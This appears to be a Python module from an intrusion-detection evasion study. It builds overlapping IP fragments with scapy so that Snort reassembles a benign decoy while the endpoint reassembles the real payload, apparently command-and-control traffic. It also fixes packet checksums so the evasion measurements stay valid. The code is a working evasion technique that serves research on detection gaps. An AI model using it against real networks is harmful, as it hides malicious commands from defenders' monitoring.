#!/usr/bin/env python3
"""Ambiguity-based mutations: make Snort and the endpoint disagree.

The previous action space was destroy-based (DROP, CORRUPT). Measured
consequence: the policy evaded 96.9% of real Snort by deleting the
payload-bearing packets (372 of 384 actions were DROP), which is not evasion.

These helpers instead keep every original byte on the wire while changing which
bytes a `policy first` reassembler believes:
  * `split_fragments`   -- cut one payload into two non-overlapping IP fragments
  * `overlap_fragments` -- plus an overlapping fragment that carries the real
    first bytes again, arriving AFTER a benign decoy at the same offset

Under `policy first` (Snort's configured behaviour) the benign decoy wins; under
`policy last` (common endpoint behaviour) the real bytes win. Both are measured
by the Phase 2 probe, not assumed.
"""
from __future__ import annotations

from typing import List, Sequence

from c2_semantics import Fragment

FRAG_UNIT = 8


def _check_split(split_at: int) -> None:
    if split_at <= 0:
        raise ValueError(f"split_at must be positive, got {split_at}")
    if split_at % FRAG_UNIT:
        raise ValueError(
            f"split_at must be a multiple of {FRAG_UNIT} (IP fragment offsets are "
            f"in 8-byte units), got {split_at}")


def split_fragments(payload: bytes, split_at: int = 8) -> List[Fragment]:
    """Two non-overlapping fragments. Reassembles to `payload` under any policy."""
    _check_split(split_at)
    if split_at >= len(payload):
        raise ValueError(
            f"split_at {split_at} >= payload length {len(payload)}; nothing to split")
    return [Fragment(offset=0, data=payload[:split_at]),
            Fragment(offset=split_at, data=payload[split_at:])]


def overlap_fragments(payload: bytes, split_at: int = 8,
                      decoy: bytes | None = None) -> List[Fragment]:
    """Three fragments: benign decoy first, real bytes overlapping later.

    Arrival order matters and is the whole mechanism:
      1. offset 0, decoy bytes        (MF set)
      2. offset split_at, real tail   (last fragment)
      3. offset 0, REAL first bytes   (MF set)  <- overlaps #1, arrives later

    `assemble(policy="first")` keeps #1 -> Snort sees the decoy.
    `assemble(policy="last")`  keeps #3 -> the endpoint sees the real command.
    """
    _check_split(split_at)
    if split_at >= len(payload):
        raise ValueError(f"split_at {split_at} >= payload length {len(payload)}")
    if decoy is None:
        decoy = b"\x00" * split_at
    if len(decoy) != split_at:
        raise ValueError(
            f"decoy must be exactly split_at={split_at} bytes, got {len(decoy)}")
    return [Fragment(offset=0, data=decoy),
            Fragment(offset=split_at, data=payload[split_at:]),
            Fragment(offset=0, data=payload[:split_at])]


def reorder_fragments(frags: Sequence[Fragment],
                      order: Sequence[int]) -> List[Fragment]:
    """Present the same fragments in a different arrival order."""
    if sorted(order) != list(range(len(frags))):
        raise ValueError(f"order must be a permutation of 0..{len(frags)-1}")
    return [frags[i] for i in order]


def fragment_plan_to_packets(packets: Sequence, frags: Sequence[Fragment],
                             target_idx: int):
    """Turn a Fragment plan into real IP-fragmented scapy packets.

    The target packet's IP/UDP headers are reused so the flow stays coherent
    (same 5-tuple, same IP id). Offsets are converted to 8-byte units, which is
    what the IP `frag` field counts. The last fragment clears MF.
    """
    from scapy.all import IP, Raw, UDP

    if target_idx < 0 or target_idx >= len(packets):
        raise IndexError(f"target_idx {target_idx} out of range")
    pkt = packets[target_idx]
    if Raw not in pkt:
        raise ValueError("target packet carries no payload to fragment")
    ip = pkt[IP]

    out = []
    n = len(frags)
    # The MF bit must be CLEARED on the fragment with the highest offset, which
    # in an overlap plan is NOT the last one in arrival order (the real-first
    # fragment arrives after the tail). Using arrival position here set MF on
    # the tail and cleared it on the overlapping head, which is malformed and
    # stops the datagram from ever being reassembled.
    max_off = max(f.offset for f in frags)
    terminator = max(i for i, f in enumerate(frags) if f.offset == max_off)
    for i, f in enumerate(frags):
        fip = IP(src=ip.src, dst=ip.dst, id=ip.id, ttl=ip.ttl,
                 frag=f.offset // FRAG_UNIT,
                 flags=0 if i == terminator else "MF")
        if UDP in pkt:
            fip = fip / UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport)
        out.append(fip / Raw(load=f.data))
    return out


def fix_checksums(pkt, new_payload: bytes):
    """Return a copy of pkt carrying new_payload with refreshed checksums.

    Snort silently discards packets whose IP/UDP/TCP checksum is wrong, so a
    payload rewrite that skipped this would make every mechanism "evade" for
    the wrong reason.  The input packet is never mutated.
    """
    from scapy.all import IP, Raw, TCP, UDP

    out = pkt.copy()
    if Raw in out:
        out[Raw].load = new_payload
    else:
        out = out / Raw(load=new_payload)
    if UDP in out:
        del out[UDP].chksum
    if TCP in out:
        del out[TCP].chksum
    if IP in out:
        del out[IP].chksum
    return IP(bytes(out))
